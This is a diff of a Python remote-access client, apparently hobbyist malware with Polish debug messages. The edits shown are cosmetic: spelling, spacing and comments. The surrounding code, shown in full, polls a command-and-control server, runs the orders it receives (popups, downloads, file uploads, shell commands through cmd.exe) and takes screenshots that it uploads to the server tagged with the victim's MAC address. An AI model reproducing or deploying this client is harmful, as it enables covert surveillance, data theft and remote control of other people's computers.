@@ -72,7 +72,7 @@ def register_at_db():
 
 """
 
-Results from executed command, are sended in decoded format.
+Results from executed command, are send in decoded format.
 This was made as additional security xD...
 Really, only for training with encoding.
 
@@ -145,7 +145,7 @@ function.
 
 def downloader(url, path, *args):
     savefilename = url.split('/')[-1]
-    r = requests.get(url, stream = True)
+    r = requests.get(url, stream=True)
     with open(path + '\\' + savefilename, 'wb') as f:
         shutil.copyfileobj(r.raw, f)
     print('Download completed.')
@@ -197,7 +197,6 @@ def screenshot():
         f.write(r.text)
     screen_name = (str(time.strftime("%Y%m%d-%H%M%S")) + '_' + (''.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))))
     print(screen_name)
-    #run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', app_dir + 'screenCapture.bat', app_dir + screen_name + '.jpg')
     run_command(sys_disk + '\\windows\\system32\\cmd.exe', '/C', 'cd ' + app_dir, '&&', 'screenCapture.bat', screen_name + '.jpg')
     payload = {
         'det_mac': det_mac
@@ -205,7 +204,7 @@ def screenshot():
     file = {
         'file': open(app_dir + screen_name + '.jpg', 'rb')
     }
-    u = s.post(home_host + '/upload/', files = file, data = payload)
+    u = s.post(home_host + '/upload/', files=file, data=payload)
     print(u.text)
 
 
@@ -233,13 +232,13 @@ This should prevent from duplicated command executions.
 
 
 received_ids = []
-sended_commands = []
+send_commands = []
 
 
 """
 
 PC try to connect to remote server - in range 0 to 100
-If exception will occur, the loop back to beginning.
+If exception (ANY) will occur, the loop back to beginning.
 
 """
 
@@ -261,6 +260,7 @@ If exceptions will be occured - the loop back to beginning.
 
 """
 
+
 payload = {
         'det_mac': det_mac
     }
@@ -270,7 +270,7 @@ while True:
     #if 1 == 1:
         print('++++ NOWA ITERCJA, DRUKUJE LISTY ++++')
         print('Otrzymane id %s' % received_ids)
-        print('Wysłane rezultaty o id %s ' % sended_commands)
+        print('Wysłane rezultaty o id %s ' % send_commands)
         # List of available commands
         command_list = {
             'popup': popup,
@@ -280,7 +280,6 @@ while True:
             'upload': fileupload
         }
         bar = s.post(home_host+'/order/', data=payload)
-        #print('DRUKUJE ORDER')
         #print(bar.text)
         # Get ID from fetched url
         received_id = bar.text[0:6]
@@ -315,18 +314,17 @@ while True:
                     command_to_run = command_list[received_command]
                     result_from_run = command_to_run(*args_list)
                 else:
-                    #If there is no arguments in received command, execute only command
-                    #print(time_curr)
+                    # If there is no arguments in received command, execute only command
                     command_to_run = command_list[received_command]
                     result_from_run = command_to_run()
-                # Add to list recived ID to further actions
+                # Add to list received ID to further actions
                 received_ids.append(received_id)
-                # Check, that executed in a few moments command was already sended or not
-                if received_id not in sended_commands:
+                # Check, that executed in a few moments command was already send or not
+                if received_id not in send_commands:
                     print('++++ WYSYLAM REZULTAT WYKONANEGO POLECENIA %s O uniqueid %s ++++' %
                           (received_command, received_id))
                     send_result(result_from_run, time_curr, det_mac, received_id)
-                    sended_commands.append(received_id)
+                    send_commands.append(received_id)
                 else:
                     print('++++ ODPOWIEDŹ NA POLECENIE %s O uniqueid %s JUŻ WYSLANA ++++' %
                           (received_command, received_id))
@@ -334,14 +332,13 @@ while True:
                 # If command was already executed - make a pong (inform CC that client is in iddle state)
                 print('++++ uniqueid %s JEST JUZ NA LISCIE, POLECENIE WCZESNIEJ WYKONANE ++++' % received_id)
                 print('++++ NIC NIE WYKONALEM, WYSYLAM PONG ++++')
-                # print('++++ DRUKUJE PONG ++++')
-                # print(pong)
+                #print(pong)
                 ping(pong, det_mac)
         else:
             # If there is no client MAC on list or command is unrecognized - inform CC that client is in iddle state.
             print('++++ NIE ZNAM TAKIEGO POLECENIA ALBO NIE MA MOJEGO MAC NA LISCIE, WYSYLAM PONG ++++')
             ping(pong, det_mac)
-    #If there is an exception (no connection or something) - go to the beginning of the loop
+    # If there is an exception (no connection or something) - go to the beginning of the loop
     except Exception as e:
         print(e)
         continue
